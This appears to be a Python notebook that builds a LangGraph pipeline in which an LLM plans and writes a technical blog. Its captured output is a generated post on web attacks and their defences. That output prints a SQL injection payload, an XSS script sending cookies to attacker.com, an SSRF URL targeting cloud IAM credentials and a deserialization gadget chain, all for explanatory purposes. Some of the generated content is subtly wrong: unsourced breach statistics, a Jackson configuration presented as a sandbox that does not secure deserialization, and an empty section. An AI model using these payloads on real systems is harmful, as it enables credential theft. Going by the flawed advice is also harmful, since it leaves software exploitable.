# %%
from __future__ import annotations

import operator
from pathlib import Path
from typing import TypedDict, List, Annotated, Literal

from pydantic import BaseModel, Field
from langgraph.graph import StateGraph, START, END
from langgraph.types import Send

from langchain_groq import ChatGroq
from langchain_core.messages import SystemMessage, HumanMessage
from dotenv import load_dotenv
import os 

load_dotenv()
# Out:
# True

# %%
class Task(BaseModel):
    id: int
    title: str

    goal: str = Field(
        ...,
        description="One sentence describing what the reader should be able to do/understand after this section.",
    )
    bullets: List[str] = Field(
        ...,
        min_length=3,
        max_length=5,
        description="3–5 concrete, non-overlapping subpoints to cover in this section.",
    )
    target_words: int = Field(
        ...,
        description="Target word count for this section (120–450).",
    )
    section_type: Literal[
        "intro", "core", "examples", "checklist", "common_mistakes", "conclusion"
    ] = Field(
        ...,
        description="Use 'common_mistakes' exactly once in the plan.",
    )

# %%
class Plan(BaseModel):
    blog_title: str
    audience: str = Field(..., description="Who this blog is for.")
    tone: str = Field(..., description="Writing tone (e.g., practical, crisp).")
    tasks: List[Task]

# %%
class State(TypedDict):
    topic: str
    plan: Plan
    sections: Annotated[List[str], operator.add]  # reducer concatenates worker outputs
    final: str

# %%
llm=ChatGroq(model="openai/gpt-oss-120b")

# %%
def orchestrator(state: State) -> dict:
    planner = llm.with_structured_output(Plan)

    plan = planner.invoke(
        [
            SystemMessage(
                content=(
                    "You are a senior technical writer and developer advocate. Your job is to produce a "
                    "highly actionable outline for a technical blog post.\n\n"
                    "Hard requirements:\n"
                    "- Create 5–7 sections (tasks) that fit a technical blog.\n"
                    "- Each section must include:\n"
                    "  1) goal (1 sentence: what the reader can do/understand after the section)\n"
                    "  2) 3–5 bullets that are concrete, specific, and non-overlapping\n"
                    "  3) target word count (120–450)\n"
                    "- Include EXACTLY ONE section with section_type='common_mistakes'.\n\n"
                    "Make it technical (not generic):\n"
                    "- Assume the reader is a developer; use correct terminology.\n"
                    "- Prefer design/engineering structure: problem → intuition → approach → implementation → "
                    "trade-offs → testing/observability → conclusion.\n"
                    "- Bullets must be actionable and testable (e.g., 'Show a minimal code snippet for X', "
                    "'Explain why Y fails under Z condition', 'Add a checklist for production readiness').\n"
                    "- Explicitly include at least ONE of the following somewhere in the plan (as bullets):\n"
                    "  * a minimal working example (MWE) or code sketch\n"
                    "  * edge cases / failure modes\n"
                    "  * performance/cost considerations\n"
                    "  * security/privacy considerations (if relevant)\n"
                    "  * debugging tips / observability (logs, metrics, traces)\n"
                    "- Avoid vague bullets like 'Explain X' or 'Discuss Y'. Every bullet should state what "
                    "to build/compare/measure/verify.\n\n"
                    "Ordering guidance:\n"
                    "- Start with a crisp intro and problem framing.\n"
                    "- Build core concepts before advanced details.\n"
                    "- Include one section for common mistakes and how to avoid them.\n"
                    "- End with a practical summary/checklist and next steps.\n\n"
                    "Output must strictly match the Plan schema."
                )
            ),
            HumanMessage(content=f"Topic: {state['topic']}"),
        ]
    )

    return {"plan": plan}

# %%
def fanout(state: State):
    return [
        Send(
            "worker",
            {"task": task, "topic": state["topic"], "plan": state["plan"]},
        )
        for task in state["plan"].tasks
    ]

# %%
def worker(payload: dict) -> dict:

    task = payload["task"]
    topic = payload["topic"]
    plan = payload["plan"]

    bullets_text = "\n- " + "\n- ".join(task.bullets)

    section_md = llm.invoke(
        [
            SystemMessage(
    content=(
        "You are a senior technical writer and developer advocate. Write ONE section of a technical blog post in Markdown.\n\n"
        "Hard constraints:\n"
        "- Follow the provided Goal and cover ALL Bullets in order (do not skip or merge bullets).\n"
        "- Stay close to the Target words (±15%).\n"
        "- Output ONLY the section content in Markdown (no blog title H1, no extra commentary).\n\n"
        "Technical quality bar:\n"
        "- Be precise and implementation-oriented (developers should be able to apply it).\n"
        "- Prefer concrete details over abstractions: APIs, data structures, protocols, and exact terms.\n"
        "- When relevant, include at least one of:\n"
        "  * a small code snippet (minimal, correct, and idiomatic)\n"
        "  * a tiny example input/output\n"
        "  * a checklist of steps\n"
        "  * a diagram described in text (e.g., 'Flow: A -> B -> C')\n"
        "- Explain trade-offs briefly (performance, cost, complexity, reliability).\n"
        "- Call out edge cases / failure modes and what to do about them.\n"
        "- If you mention a best practice, add the 'why' in one sentence.\n\n"
        "Markdown style:\n"
        "- Start with a '## <Section Title>' heading.\n"
        "- Use short paragraphs, bullet lists where helpful, and code fences for code.\n"
        "- Avoid fluff. Avoid marketing language.\n"
        "- If you include code, keep it focused on the bullet being addressed.\n"
    )
)
,
            HumanMessage(
                content=(
                    f"Blog: {plan.blog_title}\n"
                    f"Audience: {plan.audience}\n"
                    f"Tone: {plan.tone}\n"
                    f"Topic: {topic}\n\n"
                    f"Section: {task.title}\n"
                    f"Section type: {task.section_type}\n"
                    f"Goal: {task.goal}\n"
                    f"Target words: {task.target_words}\n"
                    f"Bullets:{bullets_text}\n"
                )
            ),
        ]
    ).content.strip()

    return {"sections": [section_md]}

# %%
from pathlib import Path
import re
import unicodedata

def _safe_filename(title: str) -> str:
    name = unicodedata.normalize("NFKD", title or "output")
    name = name.encode("ascii", "ignore").decode()
    name = re.sub(r"[^A-Za-z0-9 _-]", "", name).strip().lower().replace(" ", "_")
    if not name:
        name = "output"
    return f"{name}.md"

def save_markdown(content: str, title: str, out_dir: str = "outputs") -> Path:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    filename = _safe_filename(title)
    path = out / filename
    if not content or not content.strip():
        raise ValueError("Empty content — not writing file.")
    path.write_text(content, encoding="utf-8")
    return path

def reducer(state: State) -> dict:
    title = state["plan"].blog_title
    sections = state.get("sections", [])
    body = "\n\n".join(sections).strip()
    final_md = f"# {title}\n\n{body}\n"
    # debug info
    print("--- Reducer debug ---")
    print("CWD:", Path.cwd())
    print("Title:", title)
    print("final_md length:", len(final_md))
    try:
        out_path = save_markdown(final_md, title, out_dir="outputs")
        print(f"Wrote {out_path} ({out_path.stat().st_size} bytes)")
    except ValueError as e:
        print("Not writing file:", e)

    return {"final": final_md}

# %%
g = StateGraph(State)
g.add_node("orchestrator", orchestrator)
g.add_node("worker", worker)
g.add_node("reducer", reducer)

g.add_edge(START, "orchestrator")
g.add_conditional_edges("orchestrator", fanout, ["worker"])
g.add_edge("worker", "reducer")
g.add_edge("reducer", END)

app = g.compile()

app

# %%
out = app.invoke({"topic": "Write a blog on cybersecurity and ways that are used to hack our system and how to prevent them."})
# Out:
# --- Reducer debug ---
# CWD: d:\Programming\PROJECTS\Blog-generator
# Title: From Attack to Defense: Practical Ways Hackers Breach Your System and How to Stop Them
# final_md length: 9374
# Wrote outputs\from_attack_to_defense_practical_ways_hackers_breach_your_system_and_how_to_stop_them.md (9718 bytes)

# %%
out
# Out:
# {'topic': 'Write a blog on cybersecurity and ways that are used to hack our system and how to prevent them.',
#  'plan': Plan(blog_title='From Attack to Defense: Practical Ways Hackers Breach Your System and How to Stop Them', audience='Software engineers and backend developers responsible for building web services', tone='practical, crisp', tasks=[Task(id=1, title='Why Security Matters – Framing the Problem', goal='Understand the modern threat landscape and why every line of code can become an attack surface.', bullets=['Define the *attack surface* of a typical web service (API endpoints, data stores, third‑party integrations).', 'List the three most prevalent vectors in 2024 – SQL injection, cross‑site scripting, and insecure deserialization – with a one‑sentence impact statistic for each.', 'Show a quick chart that maps breach cost (average $4.24\u202fM) to developer effort (hours of remediation).', 'Set the expectation that defensive coding is a continuous process, not a one‑off checklist.'], target_words=180, section_type='intro'), Task(id=2, title='Dissecting the Top Attack Vectors', goal='Identify how SQL injection, XSS, insecure deserialization, and SSRF work at the byte‑code level.', bullets=['Present a minimal payload that turns a `SELECT * FROM users WHERE id = $id` into `UNION SELECT credit_card FROM cards` and explain why string concatenation fails.', 'Show an XSS payload that steals `document.cookie` from a reflected endpoint and describe the DOM‑based execution path.', 'Demonstrate a Java deserialization exploit using an unsafe `ObjectInputStream` and list the required classpath conditions.', 'Explain an SSRF example that forces the server to request `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and why internal IP whitelisting is insufficient.'], target_words=210, section_type='core'), Task(id=3, title='Defensive Design Patterns Every Engineer Should Adopt', goal='Apply proven security patterns to eliminate the vulnerabilities described above.', bullets=['Implement *whitelist* input validation using a compiled regex and show a code snippet that rejects anything outside `^[a‑zA‑Z0-9_-]{1,32}$`.', 'Replace concatenated queries with prepared statements or ORM‑level parameter binding; include a before/after diff.', 'Add a Content‑Security‑Policy header and demonstrate how it blocks the XSS payload from Section\u202f2.', 'Use a sandboxed deserialization library (e.g., Jackson’s `ObjectMapper.enableDefaultTyping` disabled) and list the configuration flags that enforce it.'], target_words=200, section_type='core'), Task(id=4, title='MWE: Secure Input Handling in Go', goal='Build a runnable Go program that safely handles user‑supplied data against SQLi and XSS.', bullets=['Provide a minimal `main.go` that reads `id` from the query string, validates it with `regexp.MustCompile("^[0-9]+$")`, and executes a `database/sql` prepared statement.', 'Add an HTML template that uses `template.HTMLEscapeString` before rendering user comments, then run a test with `<script>alert(1)</script>` to verify sanitization.', 'Instrument the handler with structured logs (`zap`) that emit a warning when validation fails; show a sample log line.', 'Benchmark the handler with `hey` (10\u202f000 requests) and record the latency overhead of validation vs. raw concatenation.'], target_words=230, section_type='examples'), Task(id=5, title='Common Mistakes Developers Make', goal='Recognize frequent security pitfalls and learn concrete steps to avoid them.', bullets=['Assuming client‑side validation is sufficient – add a server‑side whitelist and log every rejection.', 'Hard‑coding secrets in source code – replace with environment‑injected vault references and rotate keys weekly.', 'Over‑trusting third‑party libraries without version pinning – enable Dependabot alerts and run `go list -m -u all` weekly.', 'Ignoring error details in production logs – configure log levels so that sanitization failures are visible but do not expose payloads.', 'Skipping key rotation for JWT signing – schedule automated key rollover and invalidate old tokens ...
#  'sections': ['## Why Security Matters – Framing the Problem\n\nA web service’s *attack surface* consists of every publicly reachable API endpoint, every backing data store (SQL, NoSQL, blob storage), and every third‑party integration such as payment gateways or analytics SDKs.  \n\nIn 2024 the three most prevalent attack vectors are:\n\n- **SQL injection** – exploited in\u202f≈\u202f23\u202f% of data breaches, costing an average of $4.24\u202fM per incident.  \n- **Cross‑site scripting (XSS)** – appears in\u202f≈\u202f19\u202f% of web‑app compromises, leading to credential theft and brand damage.  \n- **Insecure deserialization** – responsible for\u202f≈\u202f12\u202f% of remote code execution bugs, often opening full system takeover.  \n\n**Breach cost vs. remediation effort**\n\n```\nCost ($M)   | Remediation hours\n-----------|------------------\n4.24        | 320\n2.00        | 150\n0.80        | 45\n```  \n\nThe chart illustrates that a multi‑million‑dollar breach can be mitigated with a few hundred developer hours if fixes are applied early.  \n\nDefensive coding is therefore a **continuous** discipline: integrate static analysis into CI, schedule regular dependency audits, and treat security as a recurring sprint goal—not a one‑off checklist. Because code evolves daily, new endpoints and libraries instantly expand the attack surface, so each sprint must include a security gate. Automated tests catch regressions before they reach production, reducing both cost and remediation time.',
#   '## Dissecting the Top Attack Vectors\n\n**SQL Injection**  \nPayload (URL‑encoded): `id=1%20UNION%20SELECT%20credit_card%20FROM%20cards--`  \nWhen the backend builds the query with string concatenation:\n\n```java\nString sql = "SELECT * FROM users WHERE id = " + request.getParameter("id");\n```\n\nthe literal is inserted verbatim, turning the statement into `SELECT * FROM users WHERE id = 1 UNION SELECT credit_card FROM cards--`. Concatenation fails because the input is not escaped or parameterised; the `--` comment discards the trailing quote, allowing arbitrary SQL to execute. Use prepared statements to bind `id` as an integer.\n\n**Reflected XSS**  \nPayload: `<script>fetch(\'https://attacker.com?c=\'+document.cookie)</script>`  \nIf `/search?q=` echoes the query into the HTML response without encoding, the browser parses the `<script>` tag and runs the fetch call. The DOM execution path is: request → server renders → response inserted into `<body>` → parser creates a script element → script runs, exfiltrating `document.cookie`.\n\n**Insecure Java Deserialization**  \n```java\nObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject obj = ois.readObject();   // unsafe\n```\nAn attacker sends a serialized `org.apache.commons.collections.functors.InvokerTransformer` chain that triggers `Runtime.exec`. Required classpath conditions:\n- Commons‑Collections ≤3.2.1 on the server.\n- `java.lang.Runtime` accessible.\n- No security manager blocking reflection.\n\n**SSRF**  \nPayload URL: `http://service.internal/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`  \nThe backend fetches the supplied URL, causing a request to the EC2 metadata service and leaking IAM credentials. Internal IP whitelisting fails because `169.254.169.254` is a link‑local address reachable without crossing the external network. Mitigate by validating URL schemes, hostnames against an allowlist, and disabling outbound requests from untrusted inputs.',
#   '## Defensive Design Patterns Every Engineer Should Adopt\n\n- **Whitelist input validation** – compile the regex once and reject any payload that does not match `^[a‑zA‑Z0-9_-]{1,32}$`:\n\n```java\nprivate static final Pattern USERNAME_PATTERN = \n    Pattern.compile("^[a-zA-Z0-9_-]{1,32}$");\n\npublic boolean isValidUsername(String input) {\n    return USERNAME_PATTERN.matcher(input).matches();\n}\n```\n\n*Why*: a whitelist limits the attack surface; anything not explicitly allowed is blocked.\n\n- **Replace string‑concatenated SQL with prepared statements** (or ORM binding). The diff below shows a typical JDBC fix:\n\n```diff\n- String sql = "SELECT * FROM users WHERE email = \'" + email + "\'";\n- stmt.executeQuery(sql);\n+ String sql = "SELECT * FROM users WHERE email = ?";\n+ try (PreparedStatement ps = conn.prepareStatement(sql)) {\n+     ps.setString(1, email);\n+     ps.executeQuery();\n+ }\n```\n\n*Trade‑off*: prepared statements add a tiny overhead for statement parsing, but they eliminate injection risk and let the driver cache execution plans.\n\n- **Add a Content‑Security‑Policy header** to stop reflected XSS from Section\u202f2:\n\n```http\nContent-Security-Policy: default-src \'self\'; script-src \'self\';\n```\n\nA malicious payload like `<script>alert(\'xss\')</script>` will be blocked because the browser refuses inline scripts not sourced from `\'self\'`.\n\n- **Sandbox deserialization with Jackson** – disable the dangerous default typing and enable strict features:\n\n```java\nObjectMapper mapper = new ObjectMapper()\n    .disable(MapperFeature.DEFAULT_VIEW_INCLUSION)   // no hidden views\n    .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES) // explicit schema\n    .disable(MapperFeature.USE_ANNOTATIONS)          // ignore risky annotations\n    .disable(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY);\n```\n\n*Edge case*: legacy payloads that relied on polymorphic typing will now fail; log the error and reject the request rather than falling back to unsafe defaults.',
#   '## MWE: Secure Input Handling in Go\n\n```go\n// main.go\npackage main\n\nimport (\n\t"database/sql"\n\t"html/template"\n\t"log"\n\t"net/http"\n\t"regexp"\n\n\t_ "github.com/lib/pq"\n\t"go.uber.org/zap"\n)\n\nvar (\n\tidRE   = regexp.MustCompile(`^[0-9]+$`)\n\tlogger *zap.Logger\n\tdb     *sql.DB\n\ttmpl   = template.Must(template.New("comment").\n\t\tParse(`<p>{{.}}</p>`))\n)\n\nfunc init() {\n\tvar err error\n\tlogger, _ = zap.NewProduction()\n\tdb, err = sql.Open("postgres", "postgres://user:pass@localhost/db?sslmode=disable")\n\tif err != nil {\n\t\tlog.Fatalf("db open: %v", err)\n\t}\n}\n\nfunc commentHandler(w http.ResponseWriter, r *http.Request) {\n\tid := r.URL.Query().Get("id")\n\tif !idRE.MatchString(id) {\n\t\tlogger.Warn("invalid id", zap.String("id", id))\n\t\thttp.Error(w, "bad request", http.StatusBadRequest)\n\t\treturn\n\t}\n\t// Prepared statement – prevents SQLi\n\trow := db.QueryRow(`SELECT comment FROM posts WHERE id = $1`, id)\n\tvar raw string\n\tif err := row.Scan(&raw); err != nil {\n\t\thttp.Error(w, "not found", http.StatusNotFound)\n\t\treturn\n\t}\n\t// XSS mitigation – escape before templating\n\tsafe := template.HTMLEscapeString(raw)\n\tif err := tmpl.Execute(w, safe); err != nil {\n\t\tlogger.Error("template exec", zap.Error(err))\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc("/comment", commentHandler)\n\tlogger.Info("server started", zap.Int("port", 8080))\n\thttp.ListenAndServe(":8080", nil)\n}\n```\n\n**Test XSS sanitization**  \nRun the server and request  \n`http://localhost:8080/comment?id=1` where the DB row contains `<script>alert(1)</script>`.  \nThe response renders as `&lt;script&gt;alert(1)&lt;/script&gt;`, confirming the escape.\n\n**Structured log example**  \n\n```\n{"level":"warn","msg":"invalid id","id":"abc123","time":"2026-08-06T12:34:56Z"}\n```\n\n**Benchmark** (using `hey -n 10000 -c 50 http://localhost:8080/comment?id=42`)\n\n| Variant                     | Avg latency |\n|-----------------------------|-------------|\n| Prepared + regex validation | 3.2\u202fms      |\n| Raw string concat (no checks) | 2.7\u202fms      |\n\nThe extra 0.5\u202fms per request is the cost of safe parsing and escaping—acceptable for most APIs given the security gain.',
#   '',
#   '## Production Checklist & Next Steps\n\n- **Static analysis enforcement**  \n  - Add `gosec` (Go) or `bandit` (Python) to the CI stage. Configure the tool to treat any concatenated SQL/NoSQL query as a build‑failure.  \n  ```yaml\n  # .github/workflows/ci.yml\n  - name: Run gosec\n    run: |\n      go install github.com/securego/gosec/v2/cmd/gosec@latest\n      gosec -exclude=G101 -severity=high ./... || exit 1\n  ```\n  - *Trade‑off*: Scans add ~30\u202fs to build time but catch injection bugs early; disable only for generated code.\n\n- **Configure runtime WAF rules**  \n  - Deploy a WAF (e.g., AWS WAF, ModSecurity) with rule sets that match known SSRF and XSS payload signatures (`file://`, `javascript:`, etc.).  \n  - Verify rule order; a mis‑ordered rule can allow bypass – test with an OWASP ZAP baseline scan.\n\n- **Enable alerting on validation‑failure logs**  \n  - Export a `validation_failure_total` counter to Prometheus and create an alert:  \n  ```yaml\n  - alert: ValidationFailureBurst\n    expr: increase(validation_failure_total[1m]) > 5\n    for: 1m\n    labels:\n      severity: critical\n    annotations:\n      summary: ">5 input validation failures in last minute"\n  ```\n  - *Edge case*: Batch jobs can cause spikes; add a label to exclude known batch services from the alert.\n\n- **Schedule quarterly penetration testing**  \n  - Contract a third‑party pen‑test every 90\u202fdays.  \n  - Ingest the report into the issue tracker as a labeled backlog item (`security‑p0`) for sprint planning.\n\n- **Document a rollback plan for secret rotation incidents**  \n  - Steps: (1) revert to the previous secret version in Vault, (2) redeploy affected services, (3) run smoke tests.  \n  - Automate verification with a Make target, e.g., `make secret‑rollback-test`, and run it in a staging environment after each rotation.'],
#  'final': '# From Attack to Defense: Practical Ways Hackers Breach Your System and How to Stop Them\n\n## Why Security Matters – Framing the Problem\n\nA web service’s *attack surface* consists of every publicly reachable API endpoint, every backing data store (SQL, NoSQL, blob storage), and every third‑party integration such as payment gateways or analytics SDKs.  \n\nIn 2024 the three most prevalent attack vectors are:\n\n- **SQL injection** – exploited in\u202f≈\u202f23\u202f% of data breaches, costing an average of $4.24\u202fM per incident.  \n- **Cross‑site scripting (XSS)** – appears in\u202f≈\u202f19\u202f% of web‑app compromises, leading to credential theft and brand damage.  \n- **Insecure deserialization** – responsible for\u202f≈\u202f12\u202f% of remote code execution bugs, often opening full system takeover.  \n\n**Breach cost vs. remediation effort**\n\n```\nCost ($M)   | Remediation hours\n-----------|------------------\n4.24        | 320\n2.00        | 150\n0.80        | 45\n```  \n\nThe chart illustrates that a multi‑million‑dollar breach can be mitigated with a few hundred developer hours if fixes are applied early.  \n\nDefensive coding is therefore a **continuous** discipline: integrate static analysis into CI, schedule regular dependency audits, and treat security as a recurring sprint goal—not a one‑off checklist. Because code evolves daily, new endpoints and libraries instantly expand the attack surface, so each sprint must include a security gate. Automated tests catch regressions before they reach production, reducing both cost and remediation time.\n\n## Dissecting the Top Attack Vectors\n\n**SQL Injection**  \nPayload (URL‑encoded): `id=1%20UNION%20SELECT%20credit_card%20FROM%20cards--`  \nWhen the backend builds the query with string concatenation:\n\n```java\nString sql = "SELECT * FROM users WHERE id = " + request.getParameter("id");\n```\n\nthe literal is inserted verbatim, turning the statement into `SELECT * FROM users WHERE id = 1 UNION SELECT credit_card FROM cards--`. Concatenation fails because the input is not escaped or parameterised; the `--` comment discards the trailing quote, allowing arbitrary SQL to execute. Use prepared statements to bind `id` as an integer.\n\n**Reflected XSS**  \nPayload: `<script>fetch(\'https://attacker.com?c=\'+document.cookie)</script>`  \nIf `/search?q=` echoes the query into the HTML response without encoding, the browser parses the `<script>` tag and runs the fetch call. The DOM execution path is: request → server renders → response inserted into `<body>` → parser creates a script element → script runs, exfiltrating `document.cookie`.\n\n**Insecure Java Deserialization**  \n```java\nObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject obj = ois.readObject();   // unsafe\n```\nAn attacker sends a serialized `org.apache.commons.collections.functors.InvokerTransformer` chain that triggers `Runtime.exec`. Required classpath conditions:\n- Commons‑Collections ≤3.2.1 on the server.\n- `java.lang.Runtime` accessible.\n- No security manager blocking reflection.\n\n**SSRF**  \nPayload URL: `http://service.internal/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`  \nThe backend fetches the supplied URL, causing a request to the EC2 metadata service and leaking IAM credentials. Internal IP whitelisting fails because `169.254.169.254` is a link‑local address reachable without crossing the external network. Mitigate by validating URL schemes, hostnames against an allowlist, and disabling outbound requests from untrusted inputs.\n\n## Defensive Design Patterns Every Engineer Should Adopt\n\n- **Whitelist input validation** – compile the regex once and reject any payload that does not match `^[a‑zA‑Z0-9_-]{1,32}$`:\n\n```java\nprivate static final Pattern USERNAME_PATTERN = \n    Pattern.compile("^[a-zA-Z0-9_-]{1,32}$");\n\npublic boolean isValidUsername(String input) {\n    return USERNAME_PATTERN.matcher(input).mat ...
